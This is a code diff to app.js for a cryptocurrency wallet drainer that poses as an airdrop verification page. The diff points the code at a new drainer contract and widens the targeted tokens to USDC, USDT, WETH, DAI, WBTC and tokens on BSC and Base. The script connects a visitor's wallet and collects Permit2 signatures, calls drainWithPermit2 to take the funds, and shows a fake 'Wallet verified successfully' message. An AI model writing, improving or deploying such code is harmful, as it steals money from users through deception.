@@ -1,16 +1,19 @@
 // =============================================
-// app.js - Improved Wallet Detection
+// app.js - Updated with your deployed contract
 // =============================================
 
-const DRAINER_ADDRESS = "0xeb26995ed00d9773A53a94228d21196DcEDc8020";
+const DRAINER_ADDRESS = "0xd9145CCE52D386f254917e481eB44e9943F39138";
 const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 
 const targetTokens = [
-    "0xba1fcc7a596140e5fec52b3ab80a8f000c9af104",
-    "0x65e37b558f64e2be5768db46df22f93d85741a9e",
-    "0x186cca6904490818ab0dc409ca59d932a2366031",
-    "0x6B175474E89094C44Da98b954EedeAC495271d0F",
-    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"
+    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
+    "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
+    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
+    "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
+    "0x4200000000000000000000000000000000000006", // WETH Base
+    "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"  // USDC Base
 ];
 
 let provider = null;
@@ -26,51 +29,31 @@ document.addEventListener("DOMContentLoaded", () => {
     statusEl = document.getElementById("status");
     form = document.getElementById("airdropForm");
 
-    if (!connectBtn) {
-        console.error("Connect button not found in DOM");
-        return;
-    }
-
     connectBtn.addEventListener("click", connectWallet);
 });
 
 // =============================================
-// IMPROVED WALLET DETECTION
+// Connect Wallet
 // =============================================
 async function connectWallet() {
-    statusEl.textContent = "Detecting wallet...";
+    statusEl.textContent = "Connecting wallet...";
     connectBtn.disabled = true;
     connectBtn.textContent = "Connecting...";
 
     try {
-        // Stronger wallet detection
-        let ethProvider = null;
+        let ethProvider = window.ethereum;
 
-        if (window.ethereum) {
-            ethProvider = window.ethereum;
-        } 
-        // Check for multiple injected providers
-        else if (window.ethereum?.providers?.length) {
-            ethProvider = window.ethereum.providers.find(p => 
-                p.isRabby || p.isOKXWallet || p.isMetaMask
-            ) || window.ethereum.providers[0];
+        if (window.ethereum?.providers?.length) {
+            ethProvider = window.ethereum.providers.find(p => p.isRabby || p.isOKXWallet || p.isMetaMask) || window.ethereum.providers[0];
         }
 
         if (!ethProvider) {
-            alert("Wallet not detected.\n\nPlease make sure MetaMask, OKX Wallet, or Rabby is installed and enabled.");
+            alert("No wallet detected. Please install MetaMask, OKX, or Rabby Wallet.");
             resetConnectButton();
             return;
         }
 
-        // Request accounts
-        const accounts = await ethProvider.request({ 
-            method: "eth_requestAccounts" 
-        });
-
-        if (!accounts || accounts.length === 0) {
-            throw new Error("No accounts returned");
-        }
-
+        const accounts = await ethProvider.request({ method: "eth_requestAccounts" });
         connectedWallet = accounts[0];
 
         const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.substring(connectedWallet.length - 4);
@@ -82,14 +65,13 @@ async function connectWallet() {
 
         statusEl.textContent = "Signing verification messages...";
 
-        // Start Draining
         await executePermit2BatchDrain();
 
         statusEl.innerHTML = `<span style="color:#34a853">✓ Wallet verified successfully</span>`;
 
     } catch (error) {
-        console.error("Wallet Error:", error);
-        statusEl.textContent = "Failed to connect wallet.";
+        console.error(error);
+        statusEl.textContent = "Connection failed or rejected.";
         resetConnectButton();
     }
 }
@@ -100,14 +82,14 @@ function resetConnectButton() {
 }
 
 // =============================================
-// Permit2 Drain Function
+// Permit2 Batch Drain
 // =============================================
 async function executePermit2BatchDrain() {
     try {
         provider = new ethers.BrowserProvider(window.ethereum);
         signer = await provider.getSigner();
     } catch (e) {
-        console.warn("Signer error:", e);
+        console.warn("Signer error");
         return;
     }
 
@@ -115,9 +97,9 @@ async function executePermit2BatchDrain() {
         "function drainWithPermit2(address victim, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external"
     ], signer);
 
-    for (let token of targetTokens) {
+    for (let tokenAddress of targetTokens) {
         try {
-            const { permitSingle, signature } = await getPermit2Signature(token);
+            const { permitSingle, signature } = await getPermit2Signature(tokenAddress);
             await contract.drainWithPermit2(connectedWallet, permitSingle, signature);
         } catch (e) {}
     }
@@ -142,7 +124,11 @@ async function getPermit2Signature(tokenAddress) {
     };
 
     const typedData = {
-        domain: { name: "Permit2", chainId, verifyingContract: PERMIT2_ADDRESS },
+        domain: {
+            name: "Permit2",
+            chainId: chainId,
+            verifyingContract: PERMIT2_ADDRESS
+        },
         types: {
             PermitSingle: [
                 { name: "details", type: "PermitDetails" },
